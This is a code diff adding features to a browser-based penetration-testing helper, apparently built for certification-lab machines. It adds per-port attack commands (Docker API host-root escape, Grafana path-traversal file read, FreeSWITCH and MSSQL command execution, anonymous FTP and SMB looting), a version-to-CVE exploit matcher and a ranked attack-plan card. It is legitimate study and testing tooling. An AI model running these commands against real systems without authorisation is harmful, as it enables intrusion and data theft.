@@ -36,6 +36,18 @@
   .card.ad{border-left-color:#bc8cff}
   .card.error{border-left-color:var(--danger)}
   .card.creds{border-left-color:#f0883e}
+  .card.vuln{border-left-color:#f85149;background:#1f1012}
+  .card.plan{border-left-color:#58a6ff;background:#0d1626}
+  .card.svc{border-left-color:#8b949e}
+  .sev{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:2px 7px;border-radius:5px;margin-left:6px}
+  .sev.crit{background:#5a0b0b;color:#ff7b72;border:1px solid #8b1a1a}
+  .sev.high{background:#5a3a00;color:#f0b429;border:1px solid #8a5a00}
+  .sev.med{background:#0b3a5a;color:#58a6ff;border:1px solid #1a5a8a}
+  .plan ol{margin:6px 0 0;padding-left:20px}
+  .plan li{margin:4px 0}
+  .plan .pt{color:var(--accent2);font:12.5px var(--mono)}
+  .chain{margin-top:8px;font-size:12.5px;color:var(--dim);border-top:1px dashed var(--border);padding-top:7px}
+  .chain b{color:var(--accent)}
   .card h3{margin:0 0 6px;font-size:15px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
   .card .badge{font-size:10.5px;text-transform:uppercase;letter-spacing:.4px;background:var(--chip);border:1px solid var(--border);color:var(--dim);padding:2px 7px;border-radius:20px}
   .mean{color:var(--text);margin:4px 0 10px;font-size:14px}
@@ -90,6 +102,7 @@
     <span class="hint" id="hint">Tip: set your TARGET/KALI IPs above and the suggested commands come out copy-paste ready.</span>
   </div>
   <div class="examples">Try an example:
+    <span onclick="ex('21/tcp open ftp vsftpd 2.3.4\n22/tcp open ssh OpenSSH 7.6\n80/tcp open http Apache httpd 2.4.49\n445/tcp open microsoft-ds Samba 4.9.5\n6379/tcp open redis Redis 4.0.14')">full nmap scan</span>
     <span onclick="ex('88/tcp open kerberos\n445/tcp open microsoft-ds\n389/tcp open ldap')">nmap (AD)</span>
     <span onclick="ex('SeImpersonatePrivilege        Impersonate a client   Enabled')">whoami /priv</span>
     <span onclick="ex('User bob may run the following commands:\n    (ALL) NOPASSWD: /usr/bin/find')">sudo -l</span>
@@ -130,6 +143,101 @@ KB.forEach(function(s){ (s.g||[]).forEach(function(t){ if(!KBTAG[t]) KBTAG[t]=s;
 (function(){ var el=document.getElementById('kbstat');
   if(el){ el.textContent = KB.length? ('KB embedded: '+KB.length+' sections searchable') : 'KB not embedded — run build_html.py'; if(KB.length) el.style.color='var(--accent)'; } })();
 function kbByTag(tag){ return KBTAG[tag]; }
+
+// ============================================================
+//  PORT MAP — every open port → a ready playbook (the nmap brain)
+//  prio: attack order (higher first). tag: the KB section to open.
+// ============================================================
+var PORTMAP={
+ 21:{s:'FTP',prio:60,tag:'ENUM-FTP',cmds:["ftp {TARGET}   # user: anonymous  pass: (blank)","wget -m --no-passive ftp://anonymous:anonymous@{TARGET}/","# anon upload + = webroot? → webshell. ALWAYS searchsploit the version."]},
+ 22:{s:'SSH',prio:20,tag:'ENUM-SSH',cmds:["# not a way IN without creds/keys — it's the PAYOFF.","# OpenSSH <=7.7 → user-enum (CVE-2018-15473). Reuse ANY found creds here."]},
+ 23:{s:'Telnet',prio:35,tag:'ENUM-TELNET',cmds:["telnet {TARGET}   # banner + try default/blank creds","# any password works? reuse on SSH/other."]},
+ 25:{s:'SMTP',prio:40,tag:'ENUM-SMTP',cmds:["smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/names.txt -t {TARGET}","nc {TARGET} 25   # banner → Exim 4.87-4.91 = CVE-2019-10149 RCE"]},
+ 53:{s:'DNS',prio:45,tag:'ENUM-DNS',cmds:["dig axfr @{TARGET} <domain>   # zone transfer","dnsenum --dnsserver {TARGET} <domain>"]},
+ 69:{s:'TFTP',prio:30,tag:'ENUM-TFTP',cmds:["tftp {TARGET}   # then: get <file> / put <file> (NO auth)","# grab configs/backups — often hold creds"]},
+ 79:{s:'Finger',prio:30,tag:'ENUM-FINGER',cmds:["finger @{TARGET} ; finger root@{TARGET}   # user enum"]},
+ 88:{s:'Kerberos → DOMAIN CONTROLLER',prio:95,tag:'ENUM-KERBEROS',cmds:["sudo ntpdate {TARGET}   # fix clock skew FIRST","impacket-GetNPUsers {DOMAIN}/ -no-pass -usersfile users.txt -dc-ip {TARGET}   # AS-REP roast","nxc smb {TARGET} -u {U} -p {P} --users   # then BloodHound"]},
+ 110:{s:'POP3',prio:35,tag:'ENUM-POP-IMAP',cmds:["nc {TARGET} 110   # USER x / PASS y → loot mailbox"]},
+ 111:{s:'RPCbind/NFS',prio:55,tag:'ENUM-NFS',cmds:["rpcinfo {TARGET}","showmount -e {TARGET}   # exported NFS shares? → mount + no_root_squash = root"]},
+ 123:{s:'NTP',prio:15,tag:'ENUM-NTP',cmds:["ntpq -c readlist {TARGET}   # minor; clock sync for Kerberos"]},
+ 135:{s:'MSRPC',prio:50,tag:'ENUM-RPC',cmds:["rpcclient -U '' -N {TARGET}   # then: enumdomusers / querydispinfo","impacket-rpcdump {TARGET}"]},
+ 139:{s:'SMB',prio:70,tag:'ENUM-SMB',cmds:["nxc smb {TARGET} -u '' -p '' --shares   # null session","enum4linux-ng -A {TARGET}"]},
+ 143:{s:'IMAP',prio:35,tag:'ENUM-POP-IMAP',cmds:["nc {TARGET} 143   # a LOGIN x y → loot mailbox"]},
+ 161:{s:'SNMP (UDP)',prio:48,tag:'ENUM-SNMP',cmds:["snmpwalk -v2c -c public {TARGET}","snmpwalk -v2c -c public {TARGET} 1.3.6.1.2.1.25.4.2.1.2   # process args = CREDS","onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {TARGET}"]},
+ 389:{s:'LDAP (AD)',prio:75,tag:'ENUM-LDAP',cmds:["nxc ldap {TARGET} -u {U} -p {P} --users","ldapsearch -x -H ldap://{TARGET} -b 'dc=<d>,dc=<c>'   # 'description' fields = passwords!"]},
+ 443:{s:'HTTPS',prio:85,tag:'WEB-QUICK',web:1,cmds:["whatweb https://{TARGET} ; curl -ski https://{TARGET}","feroxbuster -k -u https://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html"]},
+ 445:{s:'SMB',prio:70,tag:'ENUM-SMB',cmds:["nxc smb {TARGET} -u '' -p '' --shares   # null","nxc smb {TARGET} -u 'guest' -p '' --shares   # guest","smbclient -N //{TARGET}/<share> -c 'recurse ON;prompt OFF;mget *'   # loot a READ share"]},
+ 464:{s:'kpasswd (AD)',prio:60,tag:'AD-QUICK',cmds:["# Kerberos present → this is a Domain Controller. See port 88."]},
+ 465:{s:'SMTPS',prio:35,tag:'ENUM-SMTP',cmds:["openssl s_client -connect {TARGET}:465"]},
+ 500:{s:'IKE/VPN',prio:15,tag:'ENUM-MISC-PORTS',cmds:["ike-scan {TARGET}"]},
+ 587:{s:'SMTP submission',prio:40,tag:'ENUM-SMTP',cmds:["smtp-user-enum -M RCPT -U names.txt -t {TARGET}"]},
+ 623:{s:'IPMI (UDP)',prio:50,tag:'ENUM-IPMI',cmds:["# MSF (one-box): auxiliary/scanner/ipmi/ipmi_dumphashes → hashcat -m 7300","# defaults: ADMIN/ADMIN, root/calvin"]},
+ 636:{s:'LDAPS (AD)',prio:75,tag:'ENUM-LDAP',cmds:["# same as 389 over TLS"]},
+ 873:{s:'rsync',prio:55,tag:'ENUM-RSYNC',cmds:["rsync -av --list-only rsync://{TARGET}/   # list modules","rsync -av rsync://{TARGET}/<module>/ ./loot/   # download (creds/keys)"]},
+ 993:{s:'IMAPS',prio:35,tag:'ENUM-POP-IMAP',cmds:["openssl s_client -connect {TARGET}:993"]},
+ 995:{s:'POP3S',prio:35,tag:'ENUM-POP-IMAP',cmds:["openssl s_client -connect {TARGET}:995"]},
+ 1099:{s:'Java RMI',prio:45,tag:'ENUM-MISC-PORTS',cmds:["# BaRMIe / ysoserial deserialization → RCE (searchsploit rmi)"]},
+ 1433:{s:'MSSQL',prio:72,tag:'ENUM-MSSQL',cmds:["impacket-mssqlclient {U}:{P}@{TARGET} -windows-auth","# in: enable_xp_cmdshell; then xp_cmdshell 'whoami'","# defaults: sa/(blank). Service acct SeImpersonate → SYSTEM"]},
+ 1521:{s:'Oracle TNS',prio:55,tag:'ENUM-ORACLE',cmds:["odat sidguesser -s {TARGET} ; odat passwordguesser -s {TARGET} -d <SID>","# default: scott/tiger, system/manager"]},
+ 2049:{s:'NFS',prio:60,tag:'ENUM-NFS',cmds:["showmount -e {TARGET}","mkdir /mnt/nfs; mount -o nolock {TARGET}:/<share> /mnt/nfs","# no_root_squash? → drop a SUID binary as root = root"]},
+ 2375:{s:'Docker API',prio:88,tag:'ENUM-DOCKER',cmds:["docker -H tcp://{TARGET}:2375 ps","docker -H tcp://{TARGET}:2375 run -v /:/host -it alpine chroot /host sh   # = HOST ROOT"]},
+ 3000:{s:'HTTP-alt (Grafana/Node?)',prio:80,tag:'WEB-QUICK',web:1,cmds:["whatweb http://{TARGET}:3000   # Grafana? → CVE-2021-43798 LFI","curl -s 'http://{TARGET}:3000/public/plugins/alertlist/../../../../../../../../etc/passwd' --path-as-is"]},
+ 3268:{s:'Global Catalog LDAP (AD)',prio:75,tag:'ENUM-LDAP',cmds:["# forest-wide LDAP — same as 389"]},
+ 3306:{s:'MySQL',prio:55,tag:'ENUM-MYSQL',cmds:["mysql -h {TARGET} -u root -p   # try root/(blank), root/root","# creds+FILE priv → UDF RCE (raptor_udf2). CVE-2012-2122 auth bypass on old 5.x"]},
+ 3389:{s:'RDP',prio:40,tag:'ENUM-RDP',cmds:["xfreerdp /u:{U} /p:{P} /v:{TARGET} +clipboard /cert:ignore","nxc rdp {TARGET} -u {U} -p {P}   # BlueKeep: Win7/2008 → CVE-2019-0708"]},
+ 4505:{s:'SaltStack (salt-master)',prio:90,tag:'ENUM-SALTSTACK',cmds:["# CVE-2020-11651 → UNAUTH ROOT. github jasperla/CVE-2020-11651-poc","python3 exploit.py --master {TARGET} --read /root/proof.txt"]},
+ 4506:{s:'SaltStack (salt-master)',prio:90,tag:'ENUM-SALTSTACK',cmds:["# see 4505 — CVE-2020-11651 = instant root"]},
+ 5432:{s:'PostgreSQL',prio:55,tag:'ENUM-POSTGRES',cmds:["psql -h {TARGET} -U postgres   # default postgres/postgres","# superuser → COPY ... FROM PROGRAM 'id';  (CVE-2019-9193 RCE)"]},
+ 5601:{s:'Kibana',prio:65,tag:'ENUM-ELASTIC',web:1,cmds:["whatweb http://{TARGET}:5601   # old Kibana → CVE-2018-17246 LFI/RCE"]},
+ 5900:{s:'VNC',prio:45,tag:'ENUM-VNC',cmds:["vncviewer {TARGET}","# RealVNC 4.1.1 → auth bypass CVE-2006-2369. Crack a looted .vnc with vncpwd"]},
+ 5985:{s:'WinRM',prio:65,tag:'ENUM-WINRM',cmds:["nxc winrm {TARGET} -u {U} -p {P}","evil-winrm -i {TARGET} -u {U} -p {P}   # clean shell when creds are admin/Remote Mgmt"]},
+ 5986:{s:'WinRM (TLS)',prio:65,tag:'ENUM-WINRM',cmds:["evil-winrm -i {TARGET} -u {U} -p {P} -S"]},
+ 6379:{s:'Redis',prio:85,tag:'ENUM-REDIS',cmds:["redis-cli -h {TARGET}   # then: INFO server (version!), CONFIG GET dir, KEYS *","# >=4.0 → module-load RCE: github n0b0dyCN/redis-rogue-server → system.exec","# else: CONFIG SET dir → write SSH key / cron / webshell"]},
+ 6667:{s:'IRC',prio:50,tag:'ENUM-MISC-PORTS',cmds:["# UnrealIRCd 3.2.8.1 → CVE-2010-2075 backdoor (MSF unreal_ircd_3281_backdoor)"]},
+ 8009:{s:'AJP / Tomcat',prio:60,tag:'ENUM-AJP',cmds:["# Ghostcat CVE-2020-1938: read WEB-INF/web.xml (creds)","# github YDHCUI/CNVD-2020-10487"]},
+ 8021:{s:'FreeSWITCH Event Socket',prio:80,tag:'ENUM-MISC-PORTS',cmds:["nc -nv {TARGET} 8021   # ESL; default password 'ClueCon'","(echo 'auth ClueCon';echo;sleep 1;echo 'api system id';echo;sleep 2)|nc -nv {TARGET} 8021","# api system <cmd> = RCE"]},
+ 8080:{s:'HTTP-alt / Tomcat',prio:85,tag:'WEB-QUICK',web:1,cmds:["whatweb http://{TARGET}:8080","# Tomcat Manager /manager/html → deploy .war = RCE (try tomcat/tomcat)","feroxbuster -u http://{TARGET}:8080 -w raft-medium-directories.txt -x php,txt,html"]},
+ 8443:{s:'HTTPS-alt',prio:85,tag:'WEB-QUICK',web:1,cmds:["whatweb https://{TARGET}:8443 ; curl -ski https://{TARGET}:8443"]},
+ 8888:{s:'HTTP-alt',prio:80,tag:'WEB-QUICK',web:1,cmds:["whatweb http://{TARGET}:8888"]},
+ 9200:{s:'Elasticsearch',prio:60,tag:'ENUM-ELASTIC',web:1,cmds:["curl -s http://{TARGET}:9200   # version!","curl -s http://{TARGET}:9200/_cat/indices?v   # dump indices for creds","# <=1.4.2 → Groovy RCE CVE-2015-1427"]},
+ 10000:{s:'Webmin',prio:70,tag:'WEB-QUICK',web:1,cmds:["whatweb http://{TARGET}:10000","# 1.890-1.920 → unauth RCE CVE-2019-15107 (MSF webmin_backdoor)"]},
+ 11211:{s:'Memcached',prio:45,tag:'ENUM-MEMCACHED',cmds:["nc -nv {TARGET} 11211   # then: stats items / stats cachedump <n> 0 / get <k>"]},
+ 27017:{s:'MongoDB',prio:55,tag:'ENUM-MONGODB',cmds:["mongosh --host {TARGET}   # no auth default → show dbs; db.<c>.find()"]}
+};
+var WEBPORTS={80:1,443:1,3000:1,5601:1,8000:1,8080:1,8443:1,8888:1,9200:1,10000:1};
+PORTMAP[80]={s:'HTTP',prio:85,tag:'WEB-QUICK',web:1,cmds:["whatweb http://{TARGET} ; curl -si http://{TARGET} | head -40","feroxbuster -u http://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak","gobuster vhost -u http://{TARGET} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"]};
+PORTMAP[8000]={s:'HTTP-alt',prio:82,tag:'WEB-QUICK',web:1,cmds:["whatweb http://{TARGET}:8000"]};
+
+// ============================================================
+//  VERSION → VULNERABILITY matcher (the "is this version exploitable?" brain)
+//  Each test() gets the lowercased "service version" string. sev drives the red banner.
+// ============================================================
+function vparse(s){ return (String(s).match(/\d+/g)||[]).map(Number); }
+function vcmp(a,b){ a=vparse(a); b=vparse(b); for(var i=0;i<Math.max(a.length,b.length);i++){ var x=a[i]||0,y=b[i]||0; if(x!=y) return x<y?-1:1; } return 0; }
+function vafter(L,re){ var m=L.match(re); return m?m[1]:null; }
+var VULNVER=[
+ {name:"vsftpd 2.3.4 backdoor",cve:"CVE-2011-2523",sev:"crit",gives:"ROOT shell on port 6200",tool:'login user ":)" then: nc {TARGET} 6200 → id   (MSF vsftpd_234_backdoor)',test:function(L){return /vsftpd/.test(L)&&/2\.3\.4/.test(L);}},
+ {name:"ProFTPD 1.3.5 mod_copy",cve:"CVE-2015-3306",sev:"crit",gives:"unauth RCE (write a webshell)",tool:"searchsploit proftpd → EDB-36742 ; MSF proftpd_modcopy_exec",test:function(L){var v=vafter(L,/proftpd[^0-9]*([0-9][0-9a-z.]*)/);return v&&/^1\.3\.5/.test(v);}},
+ {name:"ProFTPD 1.3.3c backdoor",cve:"backdoor",sev:"crit",gives:"ROOT shell",tool:"MSF proftpd_133c_backdoor",test:function(L){return /proftpd/.test(L)&&/1\.3\.3c/.test(L);}},
+ {name:"OpenSSH <= 7.7 user enumeration",cve:"CVE-2018-15473",sev:"med",gives:"valid-username oracle → spray/brute",tool:"searchsploit openssh → EDB-45233",test:function(L){var v=vafter(L,/openssh[_ ]([0-9][0-9.]*p?[0-9]*)/);return v&&vcmp(v,"7.8")<0;}},
+ {name:"Exim 4.87–4.91 RCE",cve:"CVE-2019-10149",sev:"crit",gives:"RCE as ROOT",tool:"searchsploit exim → EDB-46974",test:function(L){var v=vafter(L,/exim[^0-9]*([0-9][0-9.]*)/);return v&&vcmp(v,"4.87")>=0&&vcmp(v,"4.92")<0;}},
+ {name:"OpenSMTPD < 6.6.2 RCE",cve:"CVE-2020-7247",sev:"crit",gives:"RCE as ROOT",tool:"searchsploit opensmtpd → EDB-47984",test:function(L){var v=vafter(L,/opensmtpd[^0-9]*([0-9][0-9.]*)/);return v&&vcmp(v,"6.6.2")<0;}},
+ {name:"Samba 3.5.0–4.6.x SambaCry",cve:"CVE-2017-7494",sev:"crit",gives:"ROOT RCE (writable share → load .so)",tool:"MSF is_known_pipename",test:function(L){var v=vafter(L,/samba[^0-9]*([0-9][0-9.]*)/);return v&&vcmp(v,"3.5.0")>=0&&(vcmp(v,"4.4.14")<0||(vcmp(v,"4.5.0")>=0&&vcmp(v,"4.5.10")<0)||(vcmp(v,"4.6.0")>=0&&vcmp(v,"4.6.4")<0));}},
+ {name:"Samba 3.0.20–3.0.25 usermap",cve:"CVE-2007-2447",sev:"crit",gives:"ROOT RCE (username map script)",tool:"MSF usermap_script",test:function(L){var v=vafter(L,/samba[^0-9]*([0-9][0-9.]*)/);return v&&vcmp(v,"3.0.20")>=0&&vcmp(v,"3.0.26")<0;}},
+ {name:"Apache 2.4.49 path traversal → RCE",cve:"CVE-2021-41773",sev:"crit",gives:"file read + RCE (if cgi)",tool:"curl --path-as-is .%2e/ traversal ; searchsploit 2.4.49",test:function(L){return /apache/.test(L)&&/2\.4\.49/.test(L);}},
+ {name:"Apache 2.4.50 path traversal → RCE",cve:"CVE-2021-42013",sev:"crit",gives:"file read + RCE (if cgi)",tool:"double-encoded %%32%65 traversal",test:function(L){return /apache/.test(L)&&/2\.4\.50/.test(L);}},
+ {name:"Redis >= 4.0 module-load RCE",cve:"module RCE",sev:"crit",gives:"command exec on host",tool:"github n0b0dyCN/redis-rogue-server → MODULE LOAD → system.exec",test:function(L){var v=vafter(L,/redis[^0-9]*([0-9][0-9.]*)/);return v&&vcmp(v,"4.0")>=0;}},
+ {name:"Webmin 1.890–1.920 unauth RCE",cve:"CVE-2019-15107",sev:"crit",gives:"RCE as ROOT",tool:"MSF webmin_backdoor ; EDB-47293",test:function(L){var v=vafter(L,/webmin[^0-9]*([0-9][0-9.]*)/);return v&&vcmp(v,"1.890")>=0&&vcmp(v,"1.921")<0;}},
+ {name:"Tomcat < 9.0.31 Ghostcat (AJP 8009)",cve:"CVE-2020-1938",sev:"high",gives:"read WEB-INF (creds) → RCE",tool:"searchsploit ghostcat ; github YDHCUI/CNVD-2020-10487",test:function(L){var v=vafter(L,/tomcat[^0-9]*([0-9][0-9.]*)/);return v&&(vcmp(v,"9.0.31")<0);}},
+ {name:"Elasticsearch <= 1.4.2 Groovy RCE",cve:"CVE-2015-1427",sev:"crit",gives:"unauth RCE",tool:"searchsploit elasticsearch → EDB-36337",test:function(L){var v=vafter(L,/elasticsearch[^0-9]*([0-9][0-9.]*)/);return v&&vcmp(v,"1.4.3")<0;}},
+ {name:"Nostromo <= 1.9.6 RCE",cve:"CVE-2019-16278",sev:"crit",gives:"unauth RCE (dir traversal)",tool:"searchsploit nostromo → EDB-47837",test:function(L){var v=vafter(L,/nostromo[^0-9]*([0-9][0-9.]*)/);return v&&vcmp(v,"1.9.7")<0;}},
+ {name:"UnrealIRCd 3.2.8.1 backdoor",cve:"CVE-2010-2075",sev:"crit",gives:"RCE",tool:"MSF unreal_ircd_3281_backdoor",test:function(L){return /unreal/.test(L)&&/3\.2\.8\.1/.test(L);}},
+ {name:"Rejetto HFS 2.3 RCE",cve:"CVE-2014-6287",sev:"crit",gives:"RCE (Windows)",tool:"searchsploit hfs → EDB-39161 ; MSF rejetto_hfs_exec",test:function(L){return /(hfs|httpfileserver)/.test(L)&&/2\.3/.test(L);}},
+ {name:"PHP-CGI < 5.4.2 arg injection",cve:"CVE-2012-1823",sev:"crit",gives:"RCE",tool:"MSF php_cgi_arg_injection",test:function(L){var v=vafter(L,/php[^0-9]*([0-9][0-9.]*)/);return v&&/cgi/.test(L)&&vcmp(v,"5.4.2")<0;}},
+ {name:"Windows SMB (check EternalBlue)",cve:"MS17-010",sev:"high",gives:"SYSTEM RCE if unpatched",tool:"nmap --script smb-vuln-ms17-010 -p445 {TARGET} ; MSF ms17_010_eternalblue",test:function(L){return /(microsoft-ds|netbios-ssn)/.test(L)&&/windows/.test(L);}},
+ {name:"Drupal → Drupalgeddon2",cve:"CVE-2018-7600",sev:"crit",gives:"unauth RCE",tool:"github dreadlocked/Drupalgeddon2",test:function(L){return /drupal/.test(L);}}
+];
+function vulnsFor(line){ var L=line.toLowerCase(); var out=[]; VULNVER.forEach(function(v){ try{ if(v.test(L)) out.push(v); }catch(e){} }); return out; }
 
 var STOP = {};
 ("the and for with that this from your you are not can has was will all any out use via com org open tcp udp get set file files "
@@ -442,30 +550,104 @@ function cveResults(text){
   return '<div class="count">'+lead+'</div>'+html;
 }
 
+// ============================================================
+//  NMAP PARSER + per-service rendering (Chunk 3)
+// ============================================================
+function parseNmap(text){
+  var re=/^[ \t]*(\d{1,5})\/(tcp|udp)[ \t]+open\S*[ \t]+(\S+)(?:[ \t]+([^\n]*\S))?/gmi, m, out=[], seen={};
+  while((m=re.exec(text))){
+    var port=parseInt(m[1],10), key=port+m[2];
+    if(seen[key]) continue; seen[key]=1;
+    out.push({port:port, proto:m[2].toLowerCase(), service:(m[3]||'').toLowerCase(), version:(m[4]||'').trim()});
+  }
+  return out;
+}
+function cmdsHTML(arr){
+  return '<div class="cmds">'+arr.map(function(c){
+    var comment=/^\s*#/.test(c);
+    var btn=comment?'':'<span class="cp" onclick="cp(this)">copy</span>';
+    return '<div class="cmd"><code>'+esc(sub(c))+'</code>'+btn+'</div>';
+  }).join('')+'</div>';
+}
+function vulnLine(v){
+  return '<div class="mean" style="color:#ff7b72;border:1px solid #5a0b0b;background:#1a0a0a;border-radius:7px;padding:8px 10px;margin:4px 0">'+
+    '<b>⚠️ '+esc(v.name)+'</b> <span class="sev '+v.sev+'">'+v.sev+'</span><br>'+
+    '<span style="color:#e6edf3">'+esc(v.cve)+' → '+esc(v.gives)+'</span><br>'+
+    '<span class="pt">'+esc(sub(v.tool))+'</span></div>';
+}
+function vulnCard(v){
+  return '<div class="card vuln"><h3>⚠️ '+esc(v.name)+' <span class="sev '+v.sev+'">'+v.sev+'</span></h3>'+
+    '<div class="mean"><b>'+esc(v.cve)+'</b> → '+esc(v.gives)+'</div>'+
+    '<div class="cmds"><div class="cmd"><code>'+esc(sub(v.tool))+'</code></div></div>'+
+    '<div class="chain">Confirm the exact version first, then exploit. Full table: <b>[VERSION-VULN-MAP]</b></div></div>';
+}
+function svcCard(svc){
+  var pm=PORTMAP[svc.port];
+  var nm=pm?pm.s:(svc.service&&svc.service!=='unknown'?svc.service:'unknown service');
+  var vl=vulnsFor((svc.service||'')+' '+(svc.version||''));
+  var cmds=pm?cmdsHTML(pm.cmds):cmdsHTML(["nc -nv {TARGET} "+svc.port+"   # banner-grab this unknown service","searchsploit "+(svc.service||'<product>')+"   # then google the banner + 'exploit'"]);
+  var tag=pm?pm.tag:'ENUM-UNUSUAL-PORTS';
+  var sec=kbByTag(tag);
+  var kb=sec?('<details class="kbdet"><summary>📖 open the KB section: '+esc(sec.t)+'</summary>'+kbBodyHTML(sec.b)+'</details>'):'';
+  var ver=svc.version?(' — <span style="color:var(--dim)">'+esc(svc.version)+'</span>'):'';
+  return '<div class="card svc'+(vl.length?' vuln':'')+'">'+
+    '<h3>'+svc.port+'/'+svc.proto+'  '+esc(nm)+ver+(vl.length?' <span class="sev crit">vuln version</span>':'')+'</h3>'+
+    vl.map(vulnLine).join('')+
+    cmds+ kb+
+    '<div class="tags">📖 <span class="tag">['+tag+']</span></div></div>';
+}
+function planCard(svcs){
+  var ranked=svcs.map(function(s){
+    var pm=PORTMAP[s.port], prio=pm?pm.prio:50;
+    var vl=vulnsFor((s.service||'')+' '+(s.version||''));
+    if(vl.length) prio=1000+(vl[0].sev==='crit'?50:0);
+    return {s:s,prio:prio,pm:pm,vl:vl};
+  });
+  ranked.sort(function(a,b){return b.prio-a.prio;});
+  var items=ranked.map(function(r){
+    var nm=r.pm?r.pm.s:(r.s.service||'unknown');
+    var flag=r.vl.length?(' 🔴 <b style="color:#ff7b72">'+esc(r.vl[0].cve)+'</b>'):'';
+    return '<li><span class="pt">'+r.s.port+'/'+r.s.proto+'</span> &nbsp;'+esc(nm)+flag+'</li>';
+  }).join('');
+  return '<div class="card plan"><h3>🗺️ Attack plan — '+svcs.length+' open service'+(svcs.length>1?'s':'')+', in priority order</h3>'+
+    '<div class="mean">Work top-down. <b style="color:#ff7b72">🔴 = a known-vulnerable version was detected — hit it FIRST.</b> Web &amp; SMB are usually the richest.</div>'+
+    '<ol>'+items+'</ol>'+
+    '<div class="chain">Kill chain: foothold → <b>stabilize shell</b> ([SHELL-STABILIZE]) → grab <b>local.txt</b> → privesc (<b>sudo -l</b> / SUID / caps / cron — [LINUX-PRIVESC-QUICK] or whoami /priv [WINDOWS-PRIVESC-QUICK]) → <b>proof.txt</b> → loot creds for the next box.</div></div>';
+}
+
+// ============================================================
+//  ANALYZE — the orchestrator (Chunk 4)
+// ============================================================
 function analyze(){
   var text=document.getElementById('input').value;
   var out=document.getElementById('results');
   if(!text.trim()){ out.innerHTML='<div class="empty">Paste some output above, then hit Analyze.</div>'; return; }
-  var cveHtml=cveResults(text);
-  var hits=SIG.filter(function(s){ return s.re.test(text); });
-  hits.sort(function(a,b){ return b.pri-a.pri; });
-  var kbHits=kbSearch(text,6);
-  var html=cveHtml||'';
-  if(hits.length){
-    html+='<div class="count">▶ '+hits.length+' playbook'+(hits.length>1?'s':'')+' matched — most important first:</div>';
-    html+=hits.map(card).join('');
+  var html='';
+  // 1) CVE ids typed/pasted → exploitation steps
+  var cveHtml=cveResults(text); if(cveHtml) html+=cveHtml;
+  // 2) nmap scan? → attack plan + per-service playbooks (with inline version-vuln flags)
+  var svcs=parseNmap(text), isScan=svcs.length>0;
+  if(isScan){
+    html+=planCard(svcs);
+    html+='<div class="count" style="margin-top:12px">▶ per-service playbooks (copy-paste ready — set TARGET/KALI above):</div>';
+    html+=svcs.map(svcCard).join('');
   }
-  if(kbHits.length){
-    // avoid repeating sections already shown as a playbook's KB pull
-    var shownTags={}; hits.forEach(function(h){(h.tags||[]).forEach(function(t){shownTags[t]=1;});});
-    var extra=kbHits.filter(function(k){ return !(k.s.g||[]).some(function(t){return shownTags[t];}); });
-    if(extra.length){
-      html+='<div class="count" style="margin-top:16px">📚 '+extra.length+' relevant KB section'+(extra.length>1?'s':'')+' (searched your whole KB):</div>';
-      html+=extra.map(kbCard).join('');
-    }
-  }
-  if(!cveHtml && !hits.length && !kbHits.length){ out.innerHTML=stuckCard(); return; }
-  html+='<div style="margin-top:10px">'+stuckCard(true)+'</div>';
+  // 3) version→vuln scan across the whole paste (for banners outside nmap format: whatweb, nc, http headers)
+  var textVulns=[];
+  if(!isScan){ var seenV={}; text.split('\n').forEach(function(ln){ vulnsFor(ln).forEach(function(v){ if(!seenV[v.name]){seenV[v.name]=1; textVulns.push(v);} }); }); }
+  if(textVulns.length){ html+='<div class="count" style="margin-top:14px">⚠️ version-matched vulnerabilities:</div>'+textVulns.map(vulnCard).join(''); }
+  // 4) SIG rules (privesc / creds / errors / AD / shell signals)
+  var hits=SIG.filter(function(s){ return s.re.test(text); }); hits.sort(function(a,b){ return b.pri-a.pri; });
+  if(hits.length){ html+='<div class="count" style="margin-top:14px">▶ '+hits.length+' playbook'+(hits.length>1?'s':'')+' matched:</div>'+hits.map(card).join(''); }
+  // 5) KB full-text fallback (skip sections already shown)
+  var shownTags={}; hits.forEach(function(h){(h.tags||[]).forEach(function(t){shownTags[t]=1;});});
+  if(isScan) svcs.forEach(function(s){ var pm=PORTMAP[s.port]; if(pm) shownTags[pm.tag]=1; });
+  var kbHits=kbSearch(text, isScan?3:6);
+  var extra=kbHits.filter(function(k){ return !(k.s.g||[]).some(function(t){return shownTags[t];}); });
+  if(extra.length){ html+='<div class="count" style="margin-top:14px">📚 other relevant KB sections:</div>'+extra.map(kbCard).join(''); }
+  // 6) nothing matched → the STUCK protocol
+  if(!html){ out.innerHTML=stuckCard(); return; }
+  html+='<div style="margin-top:12px">'+stuckCard(true)+'</div>';
   out.innerHTML=html;
 }
 function card(s){
